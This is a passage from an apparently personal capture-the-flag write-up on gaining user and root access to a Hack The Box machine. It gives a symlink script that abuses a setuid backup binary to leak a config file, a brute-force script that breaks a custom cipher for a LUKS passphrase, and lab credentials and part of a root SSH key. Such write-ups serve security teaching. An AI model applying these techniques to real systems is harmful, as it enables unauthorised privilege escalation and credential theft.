<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">chiv@forwardslash:/$ bash /tmp/.tmp/test-backup.sh</span><br><span class="line">getuid()                                                      = 1001</span><br><span class="line">getgid()                                                      = 1001</span><br><span class="line">puts(&quot;--------------------------------&quot;...----------------------------------------------------------------------</span><br><span class="line">       Pain&#x27;s Next-Gen Time Based Backup Viewer</span><br><span class="line">       v0.1</span><br><span class="line">       NOTE: not reading the right file yet,</span><br><span class="line">       only works if backup is taken in same second</span><br><span class="line"><span class="comment">----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">)                   = 277</span><br><span class="line">time(0)                                                       = 1586160529</span><br><span class="line">localtime(0x7ffe22beb160)                                     = 0x7fcca77e66a0</span><br><span class="line">malloc(13)                                                    = 0x55dc061618e0</span><br><span class="line">sprintf(&quot;08:08:49&quot;, &quot;%02d:%02d:%02d&quot;, 8, 8, 49)               = 8</span><br><span class="line">strlen(&quot;08:08:49&quot;)                                            = 8</span><br><span class="line">malloc(33)                                                    = 0x55dc06161900</span><br><span class="line">MD5_Init(0x7ffe22beb0b0, 4000, 0x55dc06161900, 0x55dc06161900) = 1</span><br><span class="line">MD5_Update(0x7ffe22beb0b0, 0x55dc061618e0, 8, 0x55dc061618e0) = 1</span><br><span class="line">MD5_Final(0x7ffe22beb110, 0x7ffe22beb0b0, 0x7ffe22beb0b0, 0)  = 1</span><br><span class="line">snprintf(&quot;0b&quot;, 32, &quot;%02x&quot;, 0xb)                               = 2</span><br><span class="line">snprintf(&quot;6c&quot;, 32, &quot;%02x&quot;, 0x6c)                              = 2</span><br><span class="line">snprintf(&quot;c9&quot;, 32, &quot;%02x&quot;, 0xc9)                              = 2</span><br><span class="line">snprintf(&quot;24&quot;, 32, &quot;%02x&quot;, 0x24)                              = 2</span><br><span class="line">snprintf(&quot;3d&quot;, 32, &quot;%02x&quot;, 0x3d)                              = 2</span><br><span class="line">snprintf(&quot;b1&quot;, 32, &quot;%02x&quot;, 0xb1)                              = 2</span><br><span class="line">snprintf(&quot;b3&quot;, 32, &quot;%02x&quot;, 0xb3)                              = 2</span><br><span class="line">snprintf(&quot;a3&quot;, 32, &quot;%02x&quot;, 0xa3)                              = 2</span><br><span class="line">snprintf(&quot;79&quot;, 32, &quot;%02x&quot;, 0x79)                              = 2</span><br><span class="line">snprintf(&quot;ef&quot;, 32, &quot;%02x&quot;, 0xef)                              = 2</span><br><span class="line">snprintf(&quot;a9&quot;, 32, &quot;%02x&quot;, 0xa9)                              = 2</span><br><span class="line">snprintf(&quot;56&quot;, 32, &quot;%02x&quot;, 0x56)                              = 2</span><br><span class="line">snprintf(&quot;41&quot;, 32, &quot;%02x&quot;, 0x41)                              = 2</span><br><span class="line">snprintf(&quot;90&quot;, 32, &quot;%02x&quot;, 0x90)                              = 2</span><br><span class="line">snprintf(&quot;62&quot;, 32, &quot;%02x&quot;, 0x62)                              = 2</span><br><span class="line">snprintf(&quot;94&quot;, 32, &quot;%02x&quot;, 0x94)                              = 2</span><br><span class="line">printf(&quot;Current Time: %s\n&quot;, &quot;08:08:49&quot;Current Time: 08:08:49</span><br><span class="line">)                      = 23</span><br><span class="line">setuid(1002)                                                  = -1</span><br><span class="line">setgid(1002)                                                  = -1</span><br><span class="line"><span class="deletion">- access(&quot;0b6cc9243db1b3a379efa95641906294&quot;..., 0)            = -1</span></span><br><span class="line"><span class="deletion">- printf(&quot;ERROR: %s Does Not Exist or Is N&quot;..., &quot;0b6cc9243db1b3a379efa95641906294&quot;...ERROR: 0b6cc9243db1b3a379efa95641906294 Does Not Exist or Is Not Accessible By Me, Exiting...) = 94</span></span><br><span class="line"><span class="addition">+ access(&quot;07af5e466d6f9402234d31da22aed4dd&quot;..., 0)             = 0</span></span><br><span class="line"><span class="addition">+ fopen(&quot;07af5e466d6f9402234d31da22aed4dd&quot;..., &quot;r&quot;)            = 0x5561d28ad690</span></span><br><span class="line"><span class="addition">+ fgetc(0x5561d28ad690)                                        = &#x27;h&#x27;</span></span><br><span class="line"><span class="addition">+ putchar(104, 0x5561d28ae910, 0x5561d28ae911, 0x7fe33e351081) = 104</span></span><br><span class="line"><span class="addition">+ fgetc(0x5561d28ad690)                                        = &#x27;e&#x27;</span></span><br><span class="line"><span class="addition">+ putchar(101, 104, 101, 0x5561d28ae912)                       = 101</span></span><br><span class="line"><span class="addition">+ fgetc(0x5561d28ad690)                                        = &#x27;l&#x27;</span></span><br><span class="line"><span class="addition">+ putchar(108, 101, 108, 0x5561d28ae913)                       = 108</span></span><br><span class="line"><span class="addition">+ fgetc(0x5561d28ad690)                                        = &#x27;l&#x27;</span></span><br><span class="line"><span class="addition">+ putchar(108, 108, 108, 0x5561d28ae914)                       = 108</span></span><br><span class="line"><span class="addition">+ fgetc(0x5561d28ad690)                                        = &#x27;o&#x27;</span></span><br><span class="line"><span class="addition">+ putchar(111, 108, 111, 0x5561d28ae915)                       = 111</span></span><br><span class="line"><span class="addition">+ fgetc(0x5561d28ad690)                                        = &#x27;\n&#x27;</span></span><br><span class="line"><span class="addition">+ putchar(10, 111, 10, 0x5561d28ae916hello)                    = 10</span></span><br><span class="line"><span class="addition">+ fgetc(0x5561d28ad690)                                        = &#x27;\377&#x27;</span></span><br><span class="line"><span class="addition">+ fclose(0x5561d28ad690)                                       = 0</span></span><br><span class="line">setuid(1001)                                                   = 0</span><br><span class="line">setgid(1001)                                                   = 0</span><br><span class="line">remove(&quot;0b6cc9243db1b3a379efa95641906294&quot;...)                  = -1</span><br><span class="line"><span class="comment">+++ exited (status 0) +++</span></span><br></pre></td></tr></table></figure>

<p>We can now see that the <code>backup</code> binary open the file and print its content to console. </p>
<p>So here is what we know so far: the <code>backup</code> binary will open a given file and display its content as <code>pain</code> user. Using symlink we should be able to read any files on the system owned by <code>pain</code> - like for example the <code>config.php.bak</code> file we found previously.</p>
<p>Let’s edit our script to try this theory:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">DATE=$(date +<span class="string">&quot;%T&quot;</span>) <span class="comment"># Get the current time</span></span><br><span class="line">MD5=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$DATE</span>&quot;</span> | md5sum | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>) <span class="comment"># MD5 of current time</span></span><br><span class="line">ln -s /var/backups/config.php.bak <span class="variable">$MD5</span></span><br><span class="line">/usr/bin/backup</span><br></pre></td></tr></table></figure>

<p>And let’s run it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">chiv@forwardslash:/$ bash /tmp/.tmp/test-backup.sh</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">       Pain<span class="string">&#x27;s Next-Gen Time Based Backup Viewer</span></span><br><span class="line"><span class="string">       v0.1</span></span><br><span class="line"><span class="string">       NOTE: not reading the right file yet,</span></span><br><span class="line"><span class="string">       only works if backup is taken in same second</span></span><br><span class="line"><span class="string">----------------------------------------------------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Current Time: 09:38:04</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">/* Database credentials. Assuming you are running MySQL</span></span><br><span class="line"><span class="string">server with default setting (user &#x27;</span>root<span class="string">&#x27; with no password) */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_SERVER<span class="string">&#x27;, &#x27;</span>localhost<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_USERNAME<span class="string">&#x27;, &#x27;</span>pain<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_PASSWORD<span class="string">&#x27;, &#x27;</span>db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_NAME<span class="string">&#x27;, &#x27;</span>site<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* Attempt to connect to MySQL database */</span></span><br><span class="line"><span class="string">$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Check connection</span></span><br><span class="line"><span class="string">if($link === false)&#123;</span></span><br><span class="line"><span class="string">    die(&quot;ERROR: Could not connect. &quot; . mysqli_connect_error());</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Neat, we got a new password for <code>pain</code>, while it’s for MySQL let’s try it on SSH:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh pain@forwardslash.htb</span><br><span class="line">pain@forwardslash.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Wed Apr 15 14:33:29 2020 from 10.10.10.10</span></span><br><span class="line"><span class="string">pain@forwardslash:~$ cat user.txt</span></span><br><span class="line"><span class="string">3xxxxxxxxxxxxxxxxxxxxxxc</span></span><br></pre></td></tr></table></figure>

<h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>Ok, after few struggles here we are with <code>pain</code> user. From here no need for a lot of recon since everything we need is in the home folder:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pain@forwardslash:~$ ls -l</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 pain root 4096 Mar 24 12:06 encryptorinator</span><br><span class="line">-rw-r--r-- 1 pain root  256 Jun  3  2019 note.txt</span><br><span class="line">-rw------- 1 pain pain   33 Apr 15 00:33 user.txt</span><br></pre></td></tr></table></figure>

<p>As a reminder the <code>note.txt</code> contains the following message:</p>
<blockquote>
<p>Pain, even though they got into our server, I made sure to encrypt any<br>important files and then did some crypto magic on the key…<br>I gave you the key in person the other day, so unless these hackers<br>are some crypto experts we should be good to go.</p>
<p>-chiv</p>
</blockquote>
<p>If we look into the <code>encryptorinator</code> folder we can find what <code>chiv</code> is talking about:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pain@forwardslash:~$ ls -l encryptorinator/</span><br><span class="line">total 8</span><br><span class="line">-rw-r--r-- 1 pain root 165 Jun  3  2019 ciphertext</span><br><span class="line">-rw-r--r-- 1 pain root 931 Jun  3  2019 encrypter.py</span><br></pre></td></tr></table></figure>

<p><code>ciphertext</code> seems to be the “<em>important file</em>“ that got encrypted, and <code>encrypter.py</code> is definitely the tool used to encrypt the file. Let’s take a look:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">key, msg</span>):</span></span><br><span class="line">    key = <span class="built_in">list</span>(key)</span><br><span class="line">    msg = <span class="built_in">list</span>(msg)</span><br><span class="line">    <span class="keyword">for</span> char_key <span class="keyword">in</span> key:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg)):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                tmp = <span class="built_in">ord</span>(msg[i]) + <span class="built_in">ord</span>(char_key) + <span class="built_in">ord</span>(msg[-<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp = <span class="built_in">ord</span>(msg[i]) + <span class="built_in">ord</span>(char_key) + <span class="built_in">ord</span>(msg[i-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> tmp &gt; <span class="number">255</span>:</span><br><span class="line">                tmp -= <span class="number">256</span></span><br><span class="line">            msg[i] = <span class="built_in">chr</span>(tmp)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">key, msg</span>):</span></span><br><span class="line">    key = <span class="built_in">list</span>(key)</span><br><span class="line">    msg = <span class="built_in">list</span>(msg)</span><br><span class="line">    <span class="keyword">for</span> char_key <span class="keyword">in</span> <span class="built_in">reversed</span>(key):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(msg))):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                tmp = <span class="built_in">ord</span>(msg[i]) - (<span class="built_in">ord</span>(char_key) + <span class="built_in">ord</span>(msg[-<span class="number">1</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp = <span class="built_in">ord</span>(msg[i]) - (<span class="built_in">ord</span>(char_key) + <span class="built_in">ord</span>(msg[i-<span class="number">1</span>]))</span><br><span class="line">            <span class="keyword">while</span> tmp &lt; <span class="number">0</span>:</span><br><span class="line">                tmp += <span class="number">256</span></span><br><span class="line">            msg[i] = <span class="built_in">chr</span>(tmp)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(msg)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> encrypt(<span class="string">&#x27;REDACTED&#x27;</span>, <span class="string">&#x27;REDACTED&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> decrypt(<span class="string">&#x27;REDACTED&#x27;</span>, encrypt(<span class="string">&#x27;REDACTED&#x27;</span>, <span class="string">&#x27;REDACTED&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>Ok, this is a not very robust crypto mechanism but definitely not trivial to break. On in opposition to Obscurity box we don’t have a clear text equivalent of the ciphertext that could help us find the key. </p>
<p>Two things are still interesting here. First we have access to the decrypt function. Second <code>chiv</code> says in the <code>note.txt</code>:</p>
<blockquote>
<p>I gave you the key in person the other day</p>
</blockquote>
<p>Well if the key was given in person, on a paper probably, it surely can’t be a super complicated key right…</p>
<p>Maybe we can try to brute-force it ? </p>
<h3 id="Encryption-key-bruteforce"><a href="#Encryption-key-bruteforce" class="headerlink" title="Encryption key bruteforce"></a>Encryption key bruteforce</h3><p>Let’s copy the script to our machine and tweak it a bit to brute-force the key using a wordlist. </p>
<p>One thing we need to think about is how our script will detect the key is correct. </p>
<p>We can notice that trying to decrypt the <code>ciphertext</code> with an incorrect key only output garbage:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python decrypter.py</span><br><span class="line">Using key: 123456</span><br><span class="line">Output: T:f;шā*4:M/<span class="string">&#x27;t$@ѷ~p2%ym/oPl+C1Rn/3ᚊʘ&lt;&gt;[P0с:JޢqLd]9˷?;0v~qVKܧUf&quot;e`.,*d     X</span></span><br></pre></td></tr></table></figure>

<p>Knowing this let’s make an <code>if</code> condition stopping the script if the output contains printable characters only, meaning the key is valid. Here is a first version:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">key, msg</span>):</span></span><br><span class="line">    key = <span class="built_in">list</span>(key)</span><br><span class="line">    msg = <span class="built_in">list</span>(msg)</span><br><span class="line">    <span class="keyword">for</span> char_key <span class="keyword">in</span> <span class="built_in">reversed</span>(key):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(msg))):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                tmp = <span class="built_in">ord</span>(msg[i]) - (<span class="built_in">ord</span>(char_key) + <span class="built_in">ord</span>(msg[-<span class="number">1</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp = <span class="built_in">ord</span>(msg[i]) - (<span class="built_in">ord</span>(char_key) + <span class="built_in">ord</span>(msg[i-<span class="number">1</span>]))</span><br><span class="line">            <span class="keyword">while</span> tmp &lt; <span class="number">0</span>:</span><br><span class="line">                tmp += <span class="number">256</span></span><br><span class="line">            msg[i] = <span class="built_in">chr</span>(tmp)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ciphertext&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> content_file:</span><br><span class="line">    encrypted = content_file.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;rockyou.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        password = line.strip()</span><br><span class="line">        decrypted = decrypt(password, encrypted)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(c <span class="keyword">in</span> string.printable <span class="keyword">for</span> c <span class="keyword">in</span> decrypted):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Key found!: &quot;</span> + password</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Decrypted ciphertext: &quot;</span> + decrypted</span><br></pre></td></tr></table></figure>

<p>Let’s run it and….</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python decrypter.py</span><br><span class="line">[hg8@archbook ~]$ </span><br></pre></td></tr></table></figure>

<p>Well no results.</p>
<p>What could be the issue here? When reading again the crypto algorithm we notice it’s possible under certain circumstances to get non-printable characters in decrypted text. </p>
<p>Another point to note is that because of the algorithm, the <code>ciphertext</code> contains the same number of characters as the decrypted source. The <code>ciphertext</code> being 165 char long <code>len(encrypted)</code>, let’s tweak our <code>if</code> condition to validate a key if the output contains total of ~158 chars are printable chars. </p>
<p>This should be enough to bypass the accidental non printable chars being present in the decrypted text:</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line"></span><br><span class="line">def decrypt(key, msg):</span><br><span class="line">    key = list(key)</span><br><span class="line">    msg = list(msg)</span><br><span class="line">    for char_key in reversed(key):</span><br><span class="line">        for i in reversed(range(len(msg))):</span><br><span class="line">            if i == 0:</span><br><span class="line">                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))</span><br><span class="line">            else:</span><br><span class="line">                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))</span><br><span class="line">            while tmp &lt; 0:</span><br><span class="line">                tmp += 256</span><br><span class="line">            msg[i] = chr(tmp)</span><br><span class="line">    return &#x27;&#x27;.join(msg)</span><br><span class="line"></span><br><span class="line">with open(&#x27;ciphertext&#x27;, &#x27;r&#x27;) as content_file:</span><br><span class="line">    encrypted = content_file.read()</span><br><span class="line"></span><br><span class="line">with open(&quot;rockyou.txt&quot;, &#x27;r&#x27;) as f:</span><br><span class="line">    for line in f:</span><br><span class="line">        password = line.strip()</span><br><span class="line">        decrypted = decrypt(password, encrypted)</span><br><span class="line"></span><br><span class="line"><span class="addition">+        print_count = sum(c in string.printable for c in decrypted)</span></span><br><span class="line"><span class="addition">+.       if print_count &gt;= 158:</span></span><br><span class="line"><span class="deletion">-        if all(c in string.printable for c in decrypted):</span></span><br><span class="line">            print &quot;Key found!: &quot; + password</span><br><span class="line">            print &quot;Decrypted ciphertext: &quot; + decrypted</span><br></pre></td></tr></table></figure>

<p>Let’s give a new try:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ]$ python decrypter.py</span><br><span class="line">Key found!: teamareporsiempre</span><br><span class="line">j%      9[lOyou liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*<span class="variable">$C2cf</span></span><br></pre></td></tr></table></figure>

<p>Alright we got a new password <code>cB!6%sdH8Lj^@Y*$C2cf</code> to decrypt the image located at <code>/var/backups/recovery</code>.</p>
<p>This explains the <code>sudo</code> entries available for <code>pain</code> user:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pain@forwardslash:~$ sudo -l</span><br><span class="line">[...]</span><br><span class="line">User pain may run the following commands on forwardslash:</span><br><span class="line">    (root) NOPASSWD: /sbin/cryptsetup luksOpen *</span><br><span class="line">    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/</span><br><span class="line">    (root) NOPASSWD: /bin/umount ./mnt/</span><br></pre></td></tr></table></figure>

<h3 id="Accessing-encrypted-LUKS-image"><a href="#Accessing-encrypted-LUKS-image" class="headerlink" title="Accessing encrypted LUKS image"></a>Accessing encrypted LUKS image</h3><p>The image located in <code>/var/backups/recovery</code> is a [Linux Unified Key Setup (LUKS)](Linux Unified Key Setup) encrypted volume. Let’s decrypt it using the password we got:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pain@forwardslash:/$ ls /var/backups/recovery/</span><br><span class="line">encrypted_backup.img</span><br><span class="line">pain@forwardslash:/$ sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup</span><br><span class="line">Enter passphrase <span class="keyword">for</span> /var/backups/recovery/encrypted_backup.img</span><br><span class="line">pain@forwardslash:/$</span><br></pre></td></tr></table></figure>

<p>The volume should have now been mapped to <code>/dev/mapper</code>, let’s mount it to access its content:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pain@forwardslash:/$ ls -l /dev/mapper</span><br><span class="line">lrwxrwxrwx 1 root root 7 Apr  6 12:49 backup -&gt; ../dm-1</span><br><span class="line">pain@forwardslash:/$ <span class="built_in">cd</span> /tmp/.tmp/</span><br><span class="line">pain@forwardslash:/tmp/.tmp/$ sudo /bin/mount /dev/mapper/backup ./mnt/</span><br><span class="line">pain@forwardslash:/tmp/.tmp/$ <span class="built_in">cd</span> mnt/</span><br><span class="line">pain@forwardslash:/tmp/.tmp/mnt$ ls</span><br><span class="line">id_rsa</span><br><span class="line">pain@forwardslash:/tmp/.tmp/mnt$ cat id_rsa</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK</span><br><span class="line">[...]</span><br><span class="line">ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>Well look at this! An SSH private key. Can’t dream any better :) </p>
<p>Let’s see if it belongs to <code>root</code> user :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa root@forwardslash.htb</span><br><span class="line">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)</span><br><span class="line"></span><br><span class="line">Last login: Tue Mar 24 12:11:46 2020 from 10.10.14.3</span><br><span class="line">root@forwardslash:~<span class="comment">#</span></span><br><span class="line">root@forwardslash:~<span class="comment"># cat root.txt</span></span><br><span class="line">5xxxxxxxxxxxxxxxxxxxxxxxxxd</span><br></pre></td></tr></table></figure>

<p>Closing note: Since the process required to mount a volume it was more important than ever to not forget cleaning after yourself, to not spoil other user and offering a “super-easy” way to root. The best way was to unmount the encrypted volume after getting the <code>id_rsa</code> and even reseting the box to make sure not forgetting anything:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pain@forwardslash:/$ <span class="built_in">cd</span> /tmp/.tmp/</span><br><span class="line">pain@forwardslash:/tmp/.tmp/$ sudo /bin/umount ./mnt/</span><br><span class="line">pain@forwardslash:/tmp/.tmp/$ <span class="built_in">cd</span> /</span><br><span class="line">pain@forwardslash:/$ rm -rf /tmp/.tmp/</span><br></pre></td></tr></table></figure>

